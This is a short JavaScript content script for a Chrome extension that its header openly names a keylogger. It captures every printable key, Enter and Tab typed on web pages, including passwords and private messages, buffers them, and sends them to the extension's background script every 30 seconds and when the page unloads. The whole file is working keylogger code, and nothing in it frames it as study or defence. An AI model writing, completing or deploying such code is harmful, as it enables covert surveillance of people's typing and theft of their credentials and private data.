// KeyLogger Content Script
// This script logs keystrokes and sends them to the background script.

// Array to store keystrokes
let keystrokes = [];

// Function to send keystrokes to background script
function sendKeystrokes() {
  if (keystrokes.length > 0) {
    chrome.runtime.sendMessage({
      type: 'keystrokes',
      data: keystrokes.join(''), // Join array into a string
      timestamp: new Date().toISOString()
    });
    // Clear the array after sending
    keystrokes = [];
  }
}

// Listen for keydown events
document.addEventListener('keydown', (event) => {
  // We want to capture printable keys and some special keys like Enter, Space, etc.
  const key = event.key;

  // Handle special keys
  if (key === ' ') {
    keystrokes.push(' ');
  } else if (key === 'Enter') {
    keystrokes.push('[ENTER]');
  } else if (key === 'Tab') {
    keystrokes.push('[TAB]');
  } else if (key === 'Backspace') {
    // For backspace, remove the last character if any
    if (keystrokes.length > 0) {
      keystrokes.pop();
    }
  } else if (key.length === 1) {
    // Printable single character
    keystrokes.push(key);
  }
  // Optionally, you can handle more special keys if needed
});

// Send keystrokes every 30 seconds
setInterval(sendKeystrokes, 30000);

// Also send when the page is unloaded (optional)
window.addEventListener('beforeunload', sendKeystrokes);
